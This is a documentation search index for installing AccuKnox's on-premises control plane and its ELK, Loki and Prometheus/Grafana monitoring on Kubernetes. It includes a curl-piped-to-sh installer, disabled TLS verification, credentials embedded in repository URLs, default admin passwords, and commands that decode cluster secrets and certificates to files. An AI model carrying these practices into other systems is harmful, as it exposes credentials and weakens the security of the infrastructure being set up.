ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace b. Updating Elastic Search Host (Runtime) \u00b6 kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d c. Update Log Path \u00b6 To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log 1.6 Kibana Dashboard Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them. 1.7 Successful Installation kubectl get all -n <namespace> kubectl port-forward svc/kibana-kb-http 5601 :5601 All the pods should be up and running. Kibana Ui with filebeat index should be seen (after beat installation). Step 2: Verify \u00b6 On Prem Elastic \u00b6 The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent. Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. 2.1 Status of Elastic with On prem Feeder Run the below command to check if agent and dependent pods are up and running. kubectl get all -n <namespace> All the pods/services should be in Running state. 2.2 Status of Beats with On prem Feeder Once the feeder agent starts running, exec into the filebeat sidecar as below. Kubectl exec -it <podname> -c filebeat-sidecar -n <namespace> filebeat -e -d \"*\" 3. Metrics Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f <podname> \u2013n <namespace>","title":"Monitoring your cluster using ELK"},{"location":"accuknox-onprem/elastic/elastic/#overview","text":"This ELK setup is used for distributed monitoring solution suitable for almost any structured and unstructured data source.","title":"Overview"},{"location":"accuknox-onprem/elastic/elastic/#step-1-elastic-operator-deployment","text":"1.1 Create a namespace of your choice. Example : elastic-logging kubectl create ns elastic-logging Note: Use feeder-service namespace , if required. 1.2 Clone the git repository git clone -b dev https://github.com/accuknox/Accuknox-Logging Navigate into the directory that holds eck-operator folder. 1.3 Helm Install (Elastic) Install the CRDs and deploy the operator with cluster-wide permissions to manage all namespaces. helm repo add elastic https://helm.elastic.co helm install elastic-operator eck-operator -n <namespace> Enable the elastic resource as true in values.yaml to install Kibana along with feeder. elasticsearch : enabled : true Note: If there is ELK set up already running on the cluster, the CRD apply may fail. 1.4 Helm Install (Kibana) Please enable the Kibana resource as true in values.yaml to install Kibana along with feeder. kibana : enabled : true Navigate into the directory that holds kibana folder. 1.5 Beats Setup The agent will be spinned along with Filebeat running along as a sidecar. The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana .","title":"Step 1: Elastic Operator Deployment"},{"location":"accuknox-onprem/elastic/elastic/#a-elastic-configuration-parameters","text":"We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. kind : ConfigMap metadata : name : filebeat-configmap data : filebeat.yml : | filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true # Paths that should be crawled and fetched. Glob based paths. paths: - /var/log/*.log output.elasticsearch: hosts: ${ELASTICSEARCH_HOST} username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} ssl.verification_mode: none The below Configuration parameters can be updated for elastic configuration. (If Default params needs to be modified) - name : ELASTICSEARCH_HOST value : https://<svc-name> - name : ELASTICSEARCH_PORT value : \"<svc-port>\" - name : ELASTICSEARCH_USERNAME value : \"elastic\" - name : ELASTICSEARCH_PASSWORD value : \"<elastic-password>\" To get elastic password kubectl get secret elasticsearch-es-elastic-user -o go-template = '{{.data.elastic | base64decode}}' -n namespace","title":"a. Elastic Configuration Parameters"},{"location":"accuknox-onprem/elastic/elastic/#b-updating-elastic-search-host-runtime","text":"kubectl set env deploy/feeder -n feeder-service ELASTICSEARCH_HOST = \u201dhttps://elasticsearch-es-http\u201d","title":"b. Updating Elastic Search Host (Runtime)"},{"location":"accuknox-onprem/elastic/elastic/#c-update-log-path","text":"To Update the Log path configured, please modify the below log input path under file beat inputs. filebeat.inputs : - type : container paths : - /log_output/cilium.log 1.6 Kibana Dashboard Once the filebeat starts listening, an index will be created or updated on the elastic configured and the pushed logs can be seen. In order to create a dashboard, you will need to build visualizations. Kibana has two panels for this One called Visualize and Another called Dashboard In order to create your dashboard, you will first create every individual visualization with the Visualize panel and save them. 1.7 Successful Installation kubectl get all -n <namespace> kubectl port-forward svc/kibana-kb-http 5601 :5601 All the pods should be up and running. Kibana Ui with filebeat index should be seen (after beat installation).","title":"c. Update Log Path"},{"location":"accuknox-onprem/elastic/elastic/#step-2-verify","text":"","title":"Step 2: Verify"},{"location":"accuknox-onprem/elastic/elastic/#on-prem-elastic","text":"The On-Prem Elastic provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent. Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine. Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations. Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack. 2.1 Status of Elastic with On prem Feeder Run the below command to check if agent and dependent pods are up and running. kubectl get all -n <namespace> All the pods/services should be in Running state. 2.2 Status of Beats with On prem Feeder Once the feeder agent starts running, exec into the filebeat sidecar as below. Kubectl exec -it <podname> -c filebeat-sidecar -n <namespace> filebeat -e -d \"*\" 3. Metrics Once the feeder agent starts running, check the logs using below command Kubectl logs \u2013f <podname> \u2013n <namespace>","title":"On Prem Elastic"},{"location":"accuknox-onprem/logging/logging/","text":"Overview \u00b6 This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads. Step 1: Create a NodePool \u00b6 Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements NodePool Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables logging:true Node Pool Name logging Step 2: Install Loki \u00b6 Install Helm: Helm binary is required to proceed further. To install Click here Add accuknox repository to install Loki helm package: helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/loki-stack --untar kubectl create namespace accuknox-loki-logging kubectl config set-context --current --namespace = accuknox-loki-logging helm install loki loki-stack/ kubectl get pods -n accuknox-loki-logging Step 3: Grafana Login \u00b6 Note: Username: admin Password: prom-operator To Change Password: Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password Add Endpoint in Grafana Data source: Click on Configuration Icon \u2192 Data source \u2192 Add data source \u2192 Select loki Update loki FQDN on loki data source UI Click on save and test. Click on explore section \u2192 Select the namespace and click \u2192 show logs","title":"Monitoring your cluster using Loki"},{"location":"accuknox-onprem/logging/logging/#overview","text":"This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads.","title":"Overview"},{"location":"accuknox-onprem/logging/logging/#step-1-create-a-nodepool","text":"Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements NodePool Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints & Lables logging:true Node Pool Name logging","title":"Step 1: Create a NodePool"},{"location":"accuknox-onprem/logging/logging/#step-2-install-loki","text":"Install Helm: Helm binary is required to proceed further. To install Click here Add accuknox repository to install Loki helm package: helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging helm repo update helm search repo accuknox-onprem-logging helm pull accuknox-onprem-logging/loki-stack --untar kubectl create namespace accuknox-loki-logging kubectl config set-context --current --namespace = accuknox-loki-logging helm install loki loki-stack/ kubectl get pods -n accuknox-loki-logging","title":"Step 2: Install Loki"},{"location":"accuknox-onprem/logging/logging/#step-3-grafana-login","text":"Note: Username: admin Password: prom-operator To Change Password: Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password Add Endpoint in Grafana Data source: Click on Configuration Icon \u2192 Data source \u2192 Add data source \u2192 Select loki Update loki FQDN on loki data source UI Click on save and test. Click on explore section \u2192 Select the namespace and click \u2192 show logs","title":"Step 3: Grafana Login"},{"location":"accuknox-onprem/monitoring/monitoring/","text":"Overview \u00b6 This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads. Step 1: Create a NodePool \u00b6 Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints & Lables monitoring:true Node Pool Name monitoring Nodeselector & Toleration \u00b6 Tolerations : - key:\u201dmonitoring\u201d operator : \u201cEqual\u201d value : \u201ctrue\u201d effect : \u201cNoSchedule\u201d Nodeselector : monitoring : \u201ctrue\u201d Install Helm: Helm binary is required to proceed further. To install Click here.. Step 2: Install Prometheus and Grafana \u00b6 Add accuknox repository to install Prometheus & Grafana helm package: helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring helm repo update helm search repo accuknox-onprem-monitoring helm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar kubectl create namespace accuknox-monitoring kubectl config set-context --current --namespace = accuknox-monitoring helm install prometheusmetrics grafana-prometheus-stack kubectl get pods -n accuknox-monitoring Step 3: Grafana Login \u00b6 Note: Username: admin Password: prom-operator To Change Password: Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password Step 4: Grafana Dashboards \u00b6 Now Click on Dashboards Icon \u2192 Browse \u2192 Select the Dashboard List of Dashboards:","title":"Monitoring your cluster using Prometheus and Grafana"},{"location":"accuknox-onprem/monitoring/monitoring/#overview","text":"This user journey guides you to set up a monitoring facility for the Accuknox control plane cluster and its workloads.","title":"Overview"},{"location":"accuknox-onprem/monitoring/monitoring/#step-1-create-a-nodepool","text":"Create a node pool on GKE / EKS / AKS (or) on-premises worker nodes with below Requirements Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints & Lables monitoring:true Node Pool Name monitoring","title":"Step 1: Create a NodePool"},{"location":"accuknox-onprem/monitoring/monitoring/#nodeselector-toleration","text":"Tolerations : - key:\u201dmonitoring\u201d operator : \u201cEqual\u201d value : \u201ctrue\u201d effect : \u201cNoSchedule\u201d Nodeselector : monitoring : \u201ctrue\u201d Install Helm: Helm binary is required to proceed further. To install Click here..","title":"Nodeselector &amp; Toleration"},{"location":"accuknox-onprem/monitoring/monitoring/#step-2-install-prometheus-and-grafana","text":"Add accuknox repository to install Prometheus & Grafana helm package: helm repo add accuknox-onprem-monitoring https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-monitoring helm repo update helm search repo accuknox-onprem-monitoring helm pull accuknox-onprem-monitoring/grafana-prometheus-stack --untar kubectl create namespace accuknox-monitoring kubectl config set-context --current --namespace = accuknox-monitoring helm install prometheusmetrics grafana-prometheus-stack kubectl get pods -n accuknox-monitoring","title":"Step 2: Install Prometheus and Grafana"},{"location":"accuknox-onprem/monitoring/monitoring/#step-3-grafana-login","text":"Note: Username: admin Password: prom-operator To Change Password: Scroll Down Below \u2192 Click on Admin Icon \u2192 Change Password","title":"Step 3: Grafana Login"},{"location":"accuknox-onprem/monitoring/monitoring/#step-4-grafana-dashboards","text":"Now Click on Dashboards Icon \u2192 Browse \u2192 Select the Dashboard List of Dashboards:","title":"Step 4: Grafana Dashboards"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/","text":"Overview \u00b6 This user journey guides you to set up end to end self-managed Accuknox control plane in the client infrastructure that provides complete control to manage, customize, and monitor Accunox control plane workloads. Create a Kubernetes Cluster Install Pre-requistites 2.1. Istio 2.2. MySQL 2.3. Kafka 2.4. Pinot 2.5. Temporal Install Core Components Install Accuknox UI Onboarding Steps Step 1: Create a Kubernetes Cluster \u00b6 Create a cluster with below hardware resources Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA Step 2: Install Pre-requisites \u00b6 Please wait for the cluster to be up and running (Ready State) and connect to the cluster and start installing prerequisites. 2.1 Istio \u00b6 Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS) curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3 cd istio-1.10.0 Create a namespace istio-system for Istio components kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system Verify the Installation Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running kubectl get pods -n istio-system Install Cert Manager Install cert-manager. Cert-manager will manage the certificates of gateway domains. When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account ) Install Cert Manager kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml All pods should have in Running state kubectl get pods -n cert-manager Installing Gateway Add Accuknox Repositories to install helm packages helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar Move to directory cd istio-gateway-charts Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the microservices under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager Find the Gateway IP INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) echo ${ INGRESS_HOST } Create DNS using IP Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using LoadBalancer IP Kindly update DNS records on cert.yaml, gateway-with-ssl.yaml, virtual-service.yaml files. Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs) that are able to generate signed certificates by honouring certificate signing requests. kubectl apply -f issuer.yaml # Should have Status as Ready kubectl get ClusterIssuer -n cert-manager A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that determines what will be honouring the certificate request. kubectl apply -f cert.yaml kubectl get Certificate -n istio-system # Should have Status as Ready Create Gateway with SSL kubectl apply -f gateway-with-ssl.yaml Apply Virtual services A virtual service defines a set of traffic routing rules to apply when a host is addressed. Each routing rule defines matching criteria for the traffic of a specific protocol. If the traffic is matched, then it is sent to a named destination service (or subset/version of it) defined in the registry. kubectl apply -f backend-api/virtual-service.yaml kubectl apply -f keycloak/virtual-service.yaml 2.2 Mysql \u00b6 helm pull accuknox-onprem-prerequisites/mysql-chart --untar kubectl create namespace accuknox-mysql cd mysql-chart kubectl apply -f bundle.yaml -n accuknox-mysql kubectl apply -f cr.yaml -n accuknox-mysql kubectl apply -f secrets.yaml -n accuknox-mysql kubectl apply -f ssl-secrets.yaml -n accuknox-mysql kubectl get secret -n accuknox-mysql | grep mysql kubectl apply -f backup-s3.yaml -n accuknox-mysql Loading schema helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar helm upgrade --install accuknox-mysql-schema mysql-schema-chart -n accuknox-mysql Verify the installation Pods should be in Running state kubectl get pods -n accuknox-mysql Note: To configure backup with GCS, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml. HMAC Keys will vary for cloud providers. (GCP, AZURE, AWS) After following steps the above steps, you will see a similar image as above Run a sanitary test with below commands at the MySQL namespace kubectl run -i --rm --tty percona-client --image = percona:8.0 --restart = Never -n accuknox-mysql -- bash -il mysql -h accuknox-mysql-haproxy -uroot -proot_password Update the passwords in secret.yaml file and run below command kubectl apply -f secrets.yaml Optional [Backup to S3 bucket] To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files. FQDN: For K8\u2019s Service name accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local 2.3 kafka \u00b6 helm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar helm install accuknox-kafka strimzi-kafka-operator -n accuknox-kafka Check pods should be in the running status kubectl get pods -n accuknox-kafka Get Bootstrap server endpoint kubectl get kafka accuknox -o jsonpath = '{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka Get CA certificate kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.p12}' -n accuknox-kafka | base64 -d > ca.p12 Note: For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication. We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster. Get CA Password kubectl get secret accuknox-cluster-ca-cert -o jsonpath = '{.data.ca\\.password}' -n accuknox-kafka | base64 -d > ca.password Get User Certificate kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.p12}' | base64 -d > user.p12 Get User Password kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath = '{.data.user\\.password}' | base64 -d > user.password Convert user.p12 to base64 encoded format cat user.p12 | base64 > user.p12.base64 Convert ca.p12 to base64 encoded format cat ca.password | base64 > ca.password.base64 Convert user.password to base64 encoded format cat user.password | base64 > user.password.base64 Convert p12 to pem format openssl pkcs12 -in ca.p12 -out ca.pem Copy the password from ca.password (file) Convert ca.pem to base64 encoded format cat ca.pem | base64 > ca.pem.base64 Note: ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files. FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity. FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092 Get Certificates and store it If the kafka cluster is upgraded or reinstalled, then the cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation). Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster. kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka > accuknox-clients-ca.yaml kubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka > accuknox-clients-ca-cert.yaml kubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka > accuknox-cluster-ca-cert.yaml kubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka > accuknox-cluster-ca.yaml kubectl get secret/node-event-feeder -o yaml -n accuknox-kafka > node-event-feeder.yaml kubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka > node-event-feeder-common.yaml Verify Kafka cluster kubectl get kafka -n accuknox-kafka 2.4 Pinot \u00b6 helm pull accuknox-onprem-prerequisites/pinot-chart --untar kubectl create namespace accuknox-pinot helm install accuknox-pinot pinot -n accuknox-pinot Pods should be in running status kubectl get pods -n accuknox-pinot Loading Schema and Tables To load schema, It is necessary to open the Pinot dashboard. Run the below command to do port-forward and open http://localhost:9000/ in the browser. kubectl port-forward svc/accuknox-pinot-controller -n accuknox-pinot 9000 :9000 Select Swagger REST API from the side panel Schema Creation Download the pinot-schemas.zip file and unzip it and load all the schemas using below steps: Click to Download Pinot Schemas Under schema, Select POST /schemas Add a new schema Click Try it out Paste the schema file at body object and Execute It should be 200 response codes and follow the same steps to create all schemas. Tables Creation Download the pinot-table.zip file and unzip it. Please load all the tables using the below steps. Click to Download Pinot Tables Under TABLE Select POST /tables Add a new table. Click Try it out Paste Table configuration file at body object and Execute It should be 200 response codes and follow the same steps to create all tables. 2.5 Temporal \u00b6 Temporal operator deployment steps kubectl create ns accuknox-temporal git clone https://github.com/temporalio/helm-charts.git mv helm-charts temporal-server-chart helm dep up temporal-server-chart helm upgrade --install accuknox-temporal-server temporal-server-chart --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false --timeout 15m -n accuknox-temporal If Prometheus/ Grafana is not required, Use the below command. helm install --set server.replicaCount = 1 --set cassandra.config.cluster_size = 1 --set prometheus.enabled = false --set grafana.enabled = false --set elasticsearch.enabled = false temporal . --timeout 15m -n accuknox-temporal kubectl get all -n temporal-server Set the namespace to Accuknox-temporal kubectl exec -n accuknox-temporal -it pod/temporaltest-admintools-<pod-id> -- /bin/bash tctl --ns accuknox-temporal n re For example, Port-forward the temporal-web (:8088) pod to view the temporal workflows UI. kubectl port-forward svc/accuknox-temporal-server-web 8088 :8088 -n accuknox-temporal Step 3: Install Core Components \u00b6 Add Accuknox repository to install Core Components helm package: helm repo add accuknox-onprem-services https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-services helm repo update helm search repo accuknox-onprem-services Run the below script to install all the accuknox Core Components. Click to Download the Script All Pods should have the Running status kubectl get pods -A Install Datapipeline API Run the below command to install the data pipeline API component helm upgrade --install accuknox-datapipeline-api accuknox-onprem-services/data-pipeline-api-charts \\ --set prometheus.host = <hostname> \\ --set prometheus.user = <username> \\ --set prometheus.password = <password> \\ -n accuknox-datapipeline-api prometheus.host - specify prometheus host name prometheus.user - specify prometheus username prometheus.password - specify prometheus password Pods should be in Running status kubectl get pods -n accuknox-datapipeline-api Install shared-informer-service Install Nginx ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.1.1/deploy/static/provider/cloud/deploy.yaml Ingress Nginx controller external IP should mapped with DNS A record like sis-api.accuknox.com kubectl get svc -n ingress-nginx Run the below command to install the shared-informer-service component For host variable need to map with DNS name helm upgrade --install accuknox-shared-informer-service accuknox-onprem-services/shared-informer-service-chart/ -n accuknox-shared-informer-service --set host = <sis-api.accuknox.com> Pods should be in Running status kubectl get pods -n accuknox-shared-informer-service kubectl get ingress -n accuknox-shared-informer-service Install Knoxautopolicy Run the below command to pull the Knoxautopolicy helm chart helm pull accuknox-onprem-services/knox-auto-policy-chart --untar Copy the password from user.password file Copy the ca.pem.base64 and user.p12.base64 file & paste in to templates/secrets.yaml file in Knoxautopolicy-chart. cluster-management-url value will be istio gateway host eg. https://api-onprem.accuknox.com For user_password variable need to map with kafka user.password file content helm install knox-auto-policy-chart \\ accuknox-onprem-services/knox-auto-policy-chart \\ --set config.application.cluster.cluster-mgmt-url = <cluster-management-url> \\ --set config.feed-consumer.kafka.keystore.pword = <user_password> \\ -n accuknox-knoxautopolicy Pods should be in Running status kubectl get pods -n accuknox-knoxautopolicy Configure Keycloak Click to Download the Accuknox UI config file Open Keycloak using the URL configured eg. keycloak.example.com Click on administration console default username \u2192 admin | default password \u2192 admin Click master add the realm Click on the Realm settings \u2192 General section Click on the login section Click on the tokens section and please configure same as below images Click Clients \u2192 click create to import the files and upload the below accuknox-ui-zip folder files. Click on accukox-ui Click on a credential Get the client secret and client id for install user-management Click on the service account roles Click on client roles \u2192 select account \u2192 select all the available roles \u2192 click add selected. Click on the broker and select the available roles and click on add selected Click on realm-management and select all the available roles and add Step 4: Install Accuknox UI \u00b6 It is mandatory to have Istio API Gateway Endpoint before deploying Accuknox UI. Attach the API gateway in Accuknox UI. Ingress Nginx controller external IP should mapped with DNS A record like app-onprem.accuknox.com kubectl get svc -n ingress-nginx UI Installation using helm helm upgrade --install accuknox-ui accuknox-onprem-services/accuknox-ui --set ingress.hostaname = <ui-hostname> ClusterIssuer should be in Ready state kubectl get ClusterIssuer Everything should be in Running status kubectl get pod kubectl get ingress Install user management For client_id and client_secret has to be taken from keycloak configuration helm upgrade --install accuknox-user-mgmt-service accuknox-onprem-services/user-management-service-chart --set config.ui.host = <app.accuknox.com> --set config.client_secret = <client_secret> --set config.client_id = <client_id> -n accuknox-user-mgmt Pods should be in Running status kubectl get pods -n accuknox-user-mgmt Login Screen \u00b6 Step 5: Onboarding Steps \u00b6 Onboard your K8\u2019s Cluster into AccuKnox Control Plane To know more \u00b6 Setup Monitoring for On-prem Setup Loki Logging Tool for On-prem Setup ELK Logging Tool for On-prem Ship logs directly to Accuknox ELK Ship logs directly to Accuknox Splunk","title":"How to setup a On-prem cluster"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#overview","text":"This user journey guides you to set up end to end self-managed Accuknox control plane in the client infrastructure that provides complete control to manage, customize, and monitor Accunox control plane workloads. Create a Kubernetes Cluster Install Pre-requistites 2.1. Istio 2.2. MySQL 2.3. Kafka 2.4. Pinot 2.5. Temporal Install Core Components Install Accuknox UI Onboarding Steps","title":"Overview"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-1-create-a-kubernetes-cluster","text":"Create a cluster with below hardware resources Components Name MySQL Kafka Pinot Core Components Node pool name mySql kafka pinot microservices No. of nodes 3 3 3 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU per nodes 16 6 12 18 Memory per nodes 20 16 40 40 Disk size per nodes 50 50 50 50 Total CPU 48 18 36 54 Total Memory 60 48 120 120 Total Disk Size 150 150 150 150 Taints and Labels mysql:true kafka:true pinot:true NA","title":"Step 1: Create a Kubernetes Cluster"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#step-2-install-pre-requisites","text":"Please wait for the cluster to be up and running (Ready State) and connect to the cluster and start installing prerequisites.","title":"Step 2: Install Pre-requisites"},{"location":"accuknox-onprem/onprem-setup-steps/accuknox-onprem/#21-istio","text":"Go to the Istio release page to download the installation file for your OS, or download and extract the latest release automatically (Linux or macOS) curl -L https://istio.io/downloadIstio | ISTIO_VERSION = 1 .10.0 TARGET_ARCH = x86_64 sh - Move to the Istio package directory. For example, if the package is istio-1.11.3 cd istio-1.10.0 Create a namespace istio-system for Istio components kubectl create namespace istio-system Install the Istio base chart which contains cluster-wide resources used by the Istio control plane helm install istio-base manifests/charts/base -n istio-system Install the Istio discovery chart which deploys the istiod control plane service helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system Install the Istio ingress gateway chart which contains the ingress gateway components helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system Verify the Installation Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running kubectl get pods -n istio-system Install Cert Manager Install cert-manager. Cert-manager will manage the certificates of gateway domains. When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019 error when creating some of the required resources. kubectl create clusterrolebinding cluster-admin-binding --clusterrole = cluster-admin --user = $( gcloud config get-value core/account ) Install Cert Manager kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml All pods should have in Running state kubectl get pods -n cert-manager Installing Gateway Add Accuknox Repositories to install helm packages helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites helm repo update helm search repo accuknox-onprem-prerequisites helm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar Move to directory cd istio-gateway-charts Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the microservices under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using cert-manager Find the Gateway IP INGRESS_HOST = $( kubectl -n istio-system get service istio-ingressgateway -o jsonpath = '{.status.loadBalancer.ingress[0].ip}' ) echo ${ INGRESS_HOST } Create DNS using IP Create A record for example (api-onprem.accuknox.com and keycloak.example.com) using 